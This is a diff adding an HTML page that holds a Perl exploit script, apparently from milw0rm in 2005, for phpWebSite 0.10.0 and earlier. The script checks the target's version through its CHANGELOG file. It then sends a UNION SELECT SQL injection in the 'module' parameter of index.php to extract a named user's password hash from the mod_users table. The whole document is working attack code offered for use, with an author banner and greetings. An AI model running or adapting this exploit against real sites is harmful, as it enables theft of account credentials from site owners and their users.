@@ -1,0 +1,55 @@
+<html>
+<head>
+<title>phpWebSite <= 0.10.0 (module) SQL Injection Exploit</title>
+<pre>
+#!/usr/bin/perl
+use LWP::Simple;
+ 
+$serv     =  $ARGV[0]; 
+$path     =  $ARGV[1]; 
+$name     =  $ARGV[2];
+    
+sub usage
+ { 
+    print &quot;\nUsage: $0 [server] [path] [username] \n&quot;; 
+    print &quot;sever    -  URL\n&quot;; 
+    print &quot;path     -  path to index.php\n&quot;; 
+    print &quot;username -  name register user\n\n&quot;; 
+    exit ();}  
+ 
+sub work
+ {
+    print qq(
+       --------------------------------- 
+#==---[    phpWebSite SQL-injection     |
+#==---[   tested ob phpWebSite-0.10.0   |
+#==---[  Gr33tz: blf, 1dt.w0lf, Pengo,  |
+#==---[       edisan, foster, whice     |
+#==---[ (c)oded by x97Rang 2005 RST/GHC |
+#==---[        http://rst.void.ru       |
+#==---[          http://ghc.ru          |
+       ---------------------------------\n\n);&amp;chv;&amp;board}
+       
+sub chv     
+ {
+    $ver  = sprintf(&quot;http://%s%s/docs/CHANGELOG.txt&quot;,$serv,$path);
+    $getv = get &quot;$ver&quot;;
+if ($getv =~ /(phpWebSite-)(\d{1})\.(\d{1,2})\.(\d{1})/){print&quot;[*] Version: $1$2.$3.$4\n&quot;;}}  
+ 
+sub board 
+ {
+    $URL = sprintf(&quot;http://%s%s/index.php?module=%27+union+select+username,password+from+mod_users+where+username=%27$name%27/*&quot;,$serv,$path);   
+    $content = get &quot;$URL&quot;;
+if ($content =~ /(\&lt;b\&gt;Search\&amp;\#160\;)(\w{32})(\&lt;\/b\&gt;)/){&amp;showh;}else{print &quot;... One of those days :)\n&quot;;}}
+ 
+sub showh
+ {
+    print &quot;[*] User: $name\n&quot;;
+    print &quot;[*] Hash: $2\n\n&quot;;}
+    
+if (@ARGV != 3){&amp;usage;}else{&amp;work;}
+
+# milw0rm.com [2005-09-15]
+</pre>
+</html>
+
